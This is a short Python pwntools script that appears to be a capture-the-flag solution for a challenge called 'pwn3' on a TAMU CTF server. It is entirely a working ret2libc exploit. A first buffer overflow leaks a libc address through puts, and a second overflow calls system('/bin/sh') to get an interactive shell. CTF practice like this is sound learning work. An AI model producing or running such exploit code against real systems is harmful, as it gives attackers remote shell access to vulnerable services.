from pwn import *

r = remote("pwn.ctf.tamu.edu", 4323)
# r = process("./pwn3")

payload = "A" * 0xf2
payload += p32(0x08048390)  # puts got
payload += p32(0x080485DB)  # pr
payload += p32(0x0804A018)  # libc got
payload += p32(0x080483D0)

r.sendlineafter("echo? ", payload)

r.recvuntil("\n")
libc = u32(r.recv(4)) - 0x18540
system = libc + 0x3ada0
binsh = libc + 0x15ba0b
log.info(hex(binsh))

payload = "A" * 0xf2
payload += p32(system)  # puts got
payload += p32(0x41414141)  # pr
payload += p32(binsh)  # libc got

r.sendlineafter("echo? ", payload)
r.interactive()
